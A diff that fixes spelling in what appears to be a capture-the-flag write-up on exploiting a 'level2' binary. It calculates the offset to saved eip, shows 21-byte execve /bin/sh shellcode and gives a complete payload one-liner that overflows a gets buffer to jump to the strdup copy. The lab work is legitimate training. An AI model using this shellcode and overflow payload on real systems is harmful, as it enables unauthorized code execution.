@@ -1,5 +1,5 @@
-In the code, we can see that there is a call to `gets` and ``strdup. Moreover we want to not be catched by the `if`. We could use a shell code to execute a shell,
-store it in the buffer that will be copied with the `strdup` and do a buffer overflow to set `eip` to the adress of our copy of our shell code.
+In the code, we can see that there is a call to `gets` and `strdup`. Moreover, we want to not be caught by the `if`. We could use a shell code to execute a shell,
+store it in the buffer that will be copied with the `strdup` and do a buffer overflow to set `eip` to the address of our copy of our shell code.
 
 ## Investigation
 
@@ -22,7 +22,7 @@ store it in the buffer that will be copied with the `strdup` and do a buffer ove
     ```
     `eip` is saved at `0xbffff71c` we can then calculate the offset between our buffer and `eip`, `0xbffff71c - 0xbffff6cc = 0x50 = 0d80`.
 
-3) Finally we need to know where `strdup` is going to save the copy of our buffer.
+3) Finally, we need to know where `strdup` is going to save the copy of our buffer.
      ```bash
      $ ltrace ./level2
      ...
@@ -49,10 +49,10 @@ int main() {
   ((void (*)()) sc)();
 }
 ```
-It have a length of 21 chars, so will need to fill `80 - 21 = 59` chars to rewrite `eip`.
+It has a length of 21 characters, therefore it will be necessary to fill `80 - 21 = 59` characters to rewrite `eip`.
 
-Our payload will be like `"<shell code>" + "a"*<offset - shell code length> + "<strdup adress>"`.
-Completed it will be `"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "a"*59 + "\x08\xa0\x04\x08"`
+Our payload will be like `"<shell code>" + "a"*<offset - shell code length> + "<strdup address>"`.
+In our case, the payload becomes: `"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "a"*59 + "\x08\xa0\x04\x08"`
 
 ```shell
 (cat <(python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "a"*59 + "\x08\xa0\x04\x08"') -) | ./level2
